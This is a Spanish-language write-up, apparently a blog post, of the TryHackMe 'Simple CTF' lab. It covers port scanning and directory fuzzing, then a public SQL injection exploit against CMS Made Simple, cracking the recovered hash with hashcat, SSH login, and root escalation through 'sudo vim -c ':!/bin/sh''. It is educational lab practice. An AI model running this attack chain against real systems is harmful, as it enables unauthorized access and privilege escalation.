---
layout: single
title: Simple CTF - TryHackMe
excerpt: "En este CTF que es para beginners de dificultad facil para a estar explotanto una vulnerabilidad de un servicio que corre la maquina que es vulnerable a SQLI ademas tendremos que aprovecharnos de que podemos correr un comando como root y asi poder convertirnos en ese usuario"
date: 2023-02-10
classes: wide
header:
  teaser: /assets/images/try-writeup-simple/logo.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
  - infosec
tags:  
  - SQLI
  - Cracking Hashes
---
![](/assets/images/try-writeup-simple/logo.png)

Comenzamos con la maquina

## PortScan

```java
# Nmap 7.93 scan initiated Fri Feb 10 20:02:27 2023 as: nmap -sCV -p21,80,1000,2222 -oN targeted 10.10.207.175
Nmap scan report for 10.10.188.76
Host is up (0.25s latency).

PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.12.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
1000/tcp filtered cadlock
2222/tcp open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que el puerto 80 esta abierto asi que podemos hacer un escaneo con `nmap` para ver si encontramos algo interesante

```shell
# Nmap 7.93 scan initiated Fri Feb 10 19:43:59 2023 as: nmap --script=http-enum -p80 -oN webScan 10.10.207.175
Nmap scan report for 10.10.188.76
Host is up (0.24s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /robots.txt: Robots file

# Nmap done at Fri Feb 10 19:44:33 2023 -- 1 IP address (1 host up) scanned in 33.56 seconds
```

Encontramos un `robots.txt` en el escaneo de nmap nos muestra algo intersante `openemr-5_0_1_3` parese ser la version del servicio


```shell
❯ whatweb http://10.10.207.175
http://10.10.207.175 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.207.175], Title[Apache2 Ubuntu Default Page: It works]
```

Esto es lo que contiene el `robots.txt`

```shell
❯ curl http://10.10.207.175/robots.txt
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

Y volvemos a ver el `openemr-5_0_1_3` podemos buscar que es o en que consiste

Vemos que tiene vulnerabilidades pero para la mayoria necesitamos estar autenticados asi que el unico que se podria usar es el `Authentication Bypass` pero ya les adelanto que no va a hacer necesario para este CTF

```
❯ searchsploit openemr 5.0.1.3
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)                   | php/webapps/49998.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)               | php/webapps/50122.rb
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                                      | linux/webapps/45202.txt
OpenEMR 5.0.1.3 - Authentication Bypass                                                       | php/webapps/50017.py
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                                       | php/webapps/45161.py
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Ahora vamos a hacer fuzzing para encontrar nuevas rutas interesantes

```shell
❯ gobuster dir -u http://10.10.207.175 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60 --add-slash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.207.175
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/02/10 23:59:57 Starting gobuster in directory enumeration mode
===============================================================
/icons/               (Status: 403) [Size: 294]
/simple/              (Status: 200) [Size: 19993]
```

Vemos una ruta llamada `simple` con status 200 asi que podemos verla

Si nos vamos abajo podemos ver que nos da la version del servicio que esta corriendo asi que vamos a buscar vulnerabilidades

![/assets/images/try-writeup-simple/content.png](/assets/images/try-writeup-simple/content.png)

Vemos que es vulnerable a una SQL Injection

```shell
❯ searchsploit cms made simple 2.2.8
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                      | php/webapps/46635.py
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Vamos a descargarnos el script para ver que como se usa

Antes de usar el script recomiendo instalar esto

```shell
python2 -m pip install termcolor
```

El script nos pide una URL 

```shell
❯ python2 sqli.py
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
```

```shell
python2 sqli.py -u http://10.10.207.175/simple
```

Pues bueno basicamente el script te da el `salt for password` `username` `email` `Password` pero ejecutando varias veces el script notaba que habia fallos y no me daba la informacion completa asi que hablando con compañeros ya que lo unico que me faltaba era la Password a algunos de ellos si les funciono XD

`username:mitch`

```shell
❯ hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 2857/2921 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Iterated
* Prepended-Salt
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($salt.$pass)
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Sat Feb 11 00:24:48 2023 (1 sec)
Time.Estimated...: Sat Feb 11 00:24:49 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    22305 H/s (1.79ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> lovers1

Started: Sat Feb 11 00:24:20 2023
Stopped: Sat Feb 11 00:24:50 2023
```

`Password:secret`

Ahora vamos a probar si podemos conectarnos por ssh ya que el puerto esta abierto

```shell
❯ ssh mitch@10.10.207.175 -p 2222
The authenticity of host '[10.10.207.175]:2222 ([10.10.207.175]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.207.175]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.207.175's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ whoami
-sh: 1: : not found
$ ls
user.txt
$ echo $SHELL
/bin/sh
$ export TERM=xterm
$ export SHELL=bash
$ whoami
mitch
$
```

## User flag

```shell
$ cat user.txt  
G00d j0b, keep up!
$
```

Vemos que hay otro usuario

```shell
$ bash
mitch@Machine:~$ ls
user.txt
mitch@Machine:~$ cd /home
mitch@Machine:/home$ ls
mitch  sunbath
mitch@Machine:/home$
```

No podemos entrar en su directorio

```shell
mitch@Machine:/home$ ll
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 ./
drwxr-xr-x 23 root    root    4096 aug 19  2019 ../
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch/
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath/
mitch@Machine:/home$ 
```

Vemos el binario `pkexec` que es SUID pero no lo vamos a explotar 

```shell
mitch@Machine:/$ find / -perm -4000 2>/dev/null
/bin/su
/bin/ping
/bin/mount
/bin/umount
/bin/ping6
/bin/fusermount
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
mitch@Machine:/$ 
```

Podemos ejecutar como el usuario root sin proporcionar contraseña este comando 

```shell
mitch@Machine:/$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
mitch@Machine:/$ 
```

Si nos vamos a Gtfobins podemos ver como aprovecharnos de esto para ser root

- [Gtfobins](https://gtfobins.github.io/gtfobins/vim/#suid)

## Root

```shell
mitch@Machine:/$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
mitch@Machine:/$ sudo vim -c ':!/bin/sh'

# whoami                            
root
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

## Root.txt
Pues ya estaria completo puedes contestar las preguntas que te hacen en TryHackMe con todo lo que hemos echo. 

```shell
# cd /root
# ls
root.txt
# cat root.txt  
W3ll d0n3. You made it!
#
```
